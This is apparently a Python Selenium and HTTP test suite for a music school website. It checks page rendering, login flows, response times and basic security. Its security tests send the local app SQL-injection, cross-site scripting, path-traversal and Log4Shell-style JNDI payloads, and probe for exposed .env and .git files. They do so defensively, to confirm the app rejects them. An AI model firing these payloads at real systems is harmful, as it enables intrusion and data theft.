"""Comprehensive MusicSchool web test suite.

Covers:
- Sanity checks
- Main flow ("main frame") checks
- Regression checks
- Performance checks (pages + APIs)
- Security checks

Usage example:
    python testing/web/full_website_test.py \
      --base-url http://127.0.0.1:5000 \
      --headless \
      --page-threshold-ms 2500 \
      --api-threshold-ms 1200

Optional credentials for login smoke coverage:
    TEST_STUDENT_EMAIL / TEST_STUDENT_PASSWORD
    TEST_TEACHER_EMAIL / TEST_TEACHER_PASSWORD
    TEST_ADMIN_EMAIL / TEST_ADMIN_PASSWORD
"""

from __future__ import annotations

import argparse
import json
import os
import statistics
import sys
import time
import unittest
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Iterable
from urllib.error import HTTPError
from urllib.parse import urlencode, urljoin
from urllib.request import Request, urlopen

from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


@dataclass(frozen=True)
class Credentials:
    email: str
    password: str


class HttpMixin:
    BASE_URL: str = "http://127.0.0.1:5000"
    HTTP_TIMEOUT_SECONDS: int = 10

    @classmethod
    def _web_url(cls, path: str, params: dict[str, str] | None = None) -> str:
        path = path if path.startswith("/") else f"/{path}"
        full_url = urljoin(cls.BASE_URL, path)
        if params:
            full_url = f"{full_url}?{urlencode(params)}"
        return full_url

    @classmethod
    def _api_url(cls, path: str, params: dict[str, str] | None = None) -> str:
        path = path if path.startswith("/") else f"/{path}"
        full_url = urljoin(cls.BASE_URL, f"/api/v1{path}")
        if params:
            full_url = f"{full_url}?{urlencode(params)}"
        return full_url

    @classmethod
    def _http_request(
        cls,
        url: str,
        method: str = "GET",
        payload: dict | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str, dict[str, str], float]:
        request_headers = {"User-Agent": "MusicSchool-TestSuite/1.0"}
        if headers:
            request_headers.update(headers)

        data = None
        if payload is not None:
            data = json.dumps(payload).encode("utf-8")
            request_headers["Content-Type"] = "application/json"

        req = Request(url=url, data=data, method=method, headers=request_headers)

        started = time.perf_counter()
        try:
            with urlopen(req, timeout=cls.HTTP_TIMEOUT_SECONDS) as response:
                body = response.read().decode("utf-8", errors="replace")
                status = response.getcode()
                resp_headers = {k: v for k, v in response.getheaders()}
        except HTTPError as exc:
            body = exc.read().decode("utf-8", errors="replace")
            status = exc.code
            resp_headers = dict(exc.headers.items()) if exc.headers else {}

        elapsed_ms = (time.perf_counter() - started) * 1000
        return status, body, resp_headers, elapsed_ms


class SeleniumBase(unittest.TestCase):
    BASE_URL: str = "http://127.0.0.1:5000"
    HEADLESS: bool = True
    DRIVER_TIMEOUT: int = 15
    CHROMEDRIVER_PATH: str | None = None

    driver: WebDriver
    wait: WebDriverWait

    @classmethod
    def setUpClass(cls) -> None:
        options = ChromeOptions()
        if cls.HEADLESS:
            options.add_argument("--headless=new")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        if cls.CHROMEDRIVER_PATH:
            service = ChromeService(executable_path=cls.CHROMEDRIVER_PATH)
            cls.driver = webdriver.Chrome(service=service, options=options)
        else:
            cls.driver = webdriver.Chrome(options=options)

        cls.wait = WebDriverWait(cls.driver, cls.DRIVER_TIMEOUT)

    @classmethod
    def tearDownClass(cls) -> None:
        cls.driver.quit()

    def _open(self, path: str) -> None:
        self.driver.get(urljoin(self.BASE_URL, path))

    def _body_ready(self) -> None:
        self.wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    def _page_contains_any(self, values: Iterable[str]) -> bool:
        source = self.driver.page_source.lower()
        return any(v.lower() in source for v in values)


class SanityAndMainFlowTests(SeleniumBase):
    """Sanity + main frame flow checks for quick confidence."""

    def _login(self, creds: Credentials, expected_paths: tuple[str, ...]) -> None:
        self._open("/auth/login")
        self.wait.until(EC.visibility_of_element_located((By.NAME, "email"))).clear()
        self.driver.find_element(By.NAME, "email").send_keys(creds.email)
        self.driver.find_element(By.NAME, "password").clear()
        self.driver.find_element(By.NAME, "password").send_keys(creds.password)
        self.driver.find_element(By.CSS_SELECTOR, "button[type='submit'], input[type='submit']").click()

        try:
            self.wait.until(lambda d: any(path in d.current_url for path in expected_paths))
        except TimeoutException:
            self.fail(
                f"Login failed. Current URL={self.driver.current_url}, expected one of={expected_paths}."
            )

    @staticmethod
    def _read_creds(email_key: str, password_key: str) -> Credentials | None:
        email = os.getenv(email_key)
        password = os.getenv(password_key)
        return Credentials(email, password) if email and password else None

    def test_01_sanity_home_page_renders(self) -> None:
        self._open("/")
        self._body_ready()
        self.assertIn("music", self.driver.page_source.lower())

    def test_02_sanity_core_public_pages(self) -> None:
        pages = ["/", "/about", "/programs", "/admissions", "/contact", "/auth/login", "/auth/signup"]
        for path in pages:
            with self.subTest(path=path):
                self._open(path)
                self._body_ready()
                self.assertNotIn("404", self.driver.title.lower())

    def test_03_main_flow_navigation(self) -> None:
        """Main frame journey through top pages and CTA-like links."""
        journey = ["/", "/programs", "/admissions", "/contact", "/auth/signup"]
        for path in journey:
            with self.subTest(step=path):
                self._open(path)
                self._body_ready()
                self.assertNotIn("internal server error", self.driver.page_source.lower())

    def test_04_main_flow_critical_forms_present(self) -> None:
        self._open("/contact")
        self.wait.until(EC.visibility_of_element_located((By.TAG_NAME, "form")))
        contact_html = self.driver.find_element(By.TAG_NAME, "form").get_attribute("innerHTML").lower()
        for field in ["name", "email", "message"]:
            self.assertIn(field, contact_html)

        self._open("/auth/signup")
        self.wait.until(EC.visibility_of_element_located((By.TAG_NAME, "form")))
        for field in ["name", "email", "password"]:
            self.assertTrue(self.driver.find_elements(By.NAME, field), f"Missing signup field: {field}")

    def test_05_main_flow_protected_routes_redirect(self) -> None:
        protected = ["/admin", "/teacher", "/student", "/my_bookings", "/booking"]
        for path in protected:
            with self.subTest(path=path):
                self._open(path)
                self._body_ready()
                self.assertTrue(
                    "/auth/login" in self.driver.current_url
                    or self._page_contains_any(["login", "sign in", "unauthorized", "forbidden"]),
                    f"Protected route {path} is not clearly auth-protected",
                )

    def test_06_regression_internal_links_do_not_500(self) -> None:
        self._open("/")
        anchors = self.driver.find_elements(By.CSS_SELECTOR, "a[href]")
        internal_hrefs = {
            a.get_attribute("href")
            for a in anchors
            if a.get_attribute("href") and self.BASE_URL in a.get_attribute("href")
        }
        self.assertGreater(len(internal_hrefs), 3)

        checked = 0
        for href in sorted(internal_hrefs):
            if any(skip in href for skip in ["mailto:", "tel:", "#"]):
                continue
            self.driver.get(href)
            self._body_ready()
            self.assertNotIn("internal server error", self.driver.page_source.lower())
            checked += 1
            if checked >= 12:
                break
        self.assertGreater(checked, 0)

    def test_07_regression_role_login_smoke_student(self) -> None:
        creds = self._read_creds("TEST_STUDENT_EMAIL", "TEST_STUDENT_PASSWORD")
        if not creds:
            self.skipTest("Student credentials not provided")
        self._login(creds, ("/student", "/my_bookings", "/booking"))

    def test_08_regression_role_login_smoke_teacher(self) -> None:
        creds = self._read_creds("TEST_TEACHER_EMAIL", "TEST_TEACHER_PASSWORD")
        if not creds:
            self.skipTest("Teacher credentials not provided")
        self._login(creds, ("/teacher", "/teacher/students", "/teacher/todaysClasses"))

    def test_09_regression_role_login_smoke_admin(self) -> None:
        creds = self._read_creds("TEST_ADMIN_EMAIL", "TEST_ADMIN_PASSWORD")
        if not creds:
            self.skipTest("Admin credentials not provided")
        self._login(creds, ("/admin", "/admin/users", "/admin/bookings"))


class PerformanceAndApiTests(HttpMixin, unittest.TestCase):
    """Performance tests for both website pages and APIs."""

    PAGE_THRESHOLD_MS: int = 2500
    API_THRESHOLD_MS: int = 1200
    PERF_SAMPLE_COUNT: int = 5

    def _timed_web_get(self, path: str) -> tuple[int, str, dict[str, str], float]:
        return self._http_request(self._web_url(path), method="GET")

    def _timed_api_get(self, path: str, params: dict[str, str] | None = None) -> tuple[int, str, dict[str, str], float]:
        return self._http_request(self._api_url(path, params=params), method="GET")

    def test_10_performance_page_load_budget(self) -> None:
        for path in ["/", "/about", "/programs", "/contact", "/auth/login"]:
            with self.subTest(path=path):
                status, _, _, ms = self._timed_web_get(path)
                self.assertLess(status, 500, f"Unexpected server error on {path}")
                self.assertLessEqual(ms, self.PAGE_THRESHOLD_MS, f"{path} too slow: {ms:.2f}ms")

    def test_11_performance_api_health_budget(self) -> None:
        status, body, _, ms = self._timed_api_get("/health")
        self.assertEqual(status, 200)
        self.assertLessEqual(ms, self.API_THRESHOLD_MS, f"/api/v1/health too slow: {ms:.2f}ms")
        payload = json.loads(body)
        self.assertTrue(payload.get("ok"))

    def test_12_performance_api_stability_p95(self) -> None:
        samples: list[float] = []
        for _ in range(self.PERF_SAMPLE_COUNT):
            status, _, _, ms = self._timed_api_get("/health")
            self.assertEqual(status, 200)
            samples.append(ms)

        samples_sorted = sorted(samples)
        p95_index = max(0, int(len(samples_sorted) * 0.95) - 1)
        p95 = samples_sorted[p95_index]
        avg = statistics.mean(samples_sorted)

        self.assertLessEqual(p95, self.API_THRESHOLD_MS, f"Health API p95 too high: {p95:.2f}ms")
        self.assertLessEqual(avg, self.API_THRESHOLD_MS, f"Health API avg too high: {avg:.2f}ms")

    def test_13_performance_concurrent_health_requests(self) -> None:
        workers = 6
        jobs = 12
        durations: list[float] = []

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(self._timed_api_get, "/health") for _ in range(jobs)]
            for f in as_completed(futures):
                status, _, _, ms = f.result()
                self.assertEqual(status, 200)
                durations.append(ms)

        self.assertEqual(len(durations), jobs)
        self.assertLessEqual(max(durations), self.API_THRESHOLD_MS * 2, "Concurrent spike too high")

    def test_14_regression_unauthorized_apis_return_401_quickly(self) -> None:
        endpoints = [
            ("/auth/me", None),
            ("/student/availability", {"start": "2026-01-01T00:00:00", "end": "2026-01-01T23:59:00"}),
            ("/teacher/bookings", None),
            ("/admin/users", None),
        ]
        for path, params in endpoints:
            with self.subTest(path=path):
                status, _, _, ms = self._timed_api_get(path, params=params)
                self.assertEqual(status, 401)
                self.assertLessEqual(ms, self.API_THRESHOLD_MS)


class SecurityTests(HttpMixin, unittest.TestCase):
    """Security-focused checks for common web/API risks."""

    def test_15_security_no_common_sensitive_files_exposed(self) -> None:
        paths = ["/.env", "/.git/config", "/config.py.bak", "/db.sqlite", "/server-status"]
        for path in paths:
            with self.subTest(path=path):
                status, _, _, _ = self._http_request(self._web_url(path), method="GET")
                self.assertIn(status, {401, 403, 404})

    def test_16_security_suspicious_query_strings_do_not_500(self) -> None:
        payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../../../etc/passwd",
            "${jndi:ldap://example.com/a}",
        ]
        for payload in payloads:
            with self.subTest(payload=payload):
                status, body, _, _ = self._http_request(
                    self._web_url("/programs", params={"q": payload}),
                    method="GET",
                )
                self.assertLess(status, 500)
                self.assertNotIn("traceback", body.lower())

    def test_17_security_api_rejects_invalid_login_payload(self) -> None:
        attack_payloads = [
            {"email": "' OR '1'='1", "password": "anything"},
            {"email": "<script>@x.com", "password": "bad"},
            {"email": "", "password": ""},
        ]
        for payload in attack_payloads:
            with self.subTest(payload=payload):
                status, body, _, _ = self._http_request(
                    self._api_url("/auth/login"),
                    method="POST",
                    payload=payload,
                )
                self.assertIn(status, {401, 422})
                self.assertNotIn("traceback", body.lower())

    def test_18_security_basic_security_headers_present(self) -> None:
        """Best-effort check for recommended headers on public pages."""
        status, _, headers, _ = self._http_request(self._web_url("/"), method="GET")
        self.assertLess(status, 500)

        normalized = {k.lower(): v for k, v in headers.items()}
        recommended = [
            "x-content-type-options",
            "x-frame-options",
            "referrer-policy",
            "content-security-policy",
        ]
        present_count = sum(1 for h in recommended if h in normalized)

        # Not all apps configure every header; require at least one to flag complete absence.
        self.assertGreaterEqual(
            present_count,
            1,
            "No common security headers found. Consider setting CSP, X-Frame-Options, etc.",
        )

    def test_19_security_disallow_unsafe_methods_on_public_pages(self) -> None:
        for path in ["/", "/about", "/programs"]:
            with self.subTest(path=path):
                status, _, _, _ = self._http_request(self._web_url(path), method="TRACE")
                self.assertIn(status, {403, 404, 405, 501})


def parse_args() -> tuple[argparse.Namespace, list[str]]:
    parser = argparse.ArgumentParser(description="Run comprehensive MusicSchool web tests.")
    parser.add_argument("--base-url", default="http://127.0.0.1:5000", help="Base URL of running MusicSchool app")
    parser.add_argument("--headed", action="store_true", help="Run browser tests with visible UI")
    parser.add_argument("--headless", action="store_true", help="Force headless browser mode")
    parser.add_argument("--timeout", type=int, default=15, help="Selenium wait timeout (seconds)")
    parser.add_argument("--http-timeout", type=int, default=10, help="HTTP/API timeout (seconds)")
    parser.add_argument("--page-threshold-ms", type=int, default=2500, help="Page performance threshold")
    parser.add_argument("--api-threshold-ms", type=int, default=1200, help="API performance threshold")
    parser.add_argument("--perf-samples", type=int, default=5, help="Sample count for p95/avg checks")
    parser.add_argument("--chromedriver-path", default=None, help="Optional explicit chromedriver path")
    return parser.parse_known_args()


if __name__ == "__main__":
    args, unittest_argv = parse_args()

    SeleniumBase.BASE_URL = args.base_url
    SeleniumBase.HEADLESS = True if args.headless else not args.headed
    SeleniumBase.DRIVER_TIMEOUT = args.timeout
    SeleniumBase.CHROMEDRIVER_PATH = args.chromedriver_path

    HttpMixin.BASE_URL = args.base_url
    HttpMixin.HTTP_TIMEOUT_SECONDS = args.http_timeout

    PerformanceAndApiTests.PAGE_THRESHOLD_MS = args.page_threshold_ms
    PerformanceAndApiTests.API_THRESHOLD_MS = args.api_threshold_ms
    PerformanceAndApiTests.PERF_SAMPLE_COUNT = max(3, args.perf_samples)

    unittest.main(argv=[sys.argv[0], *unittest_argv], verbosity=2)
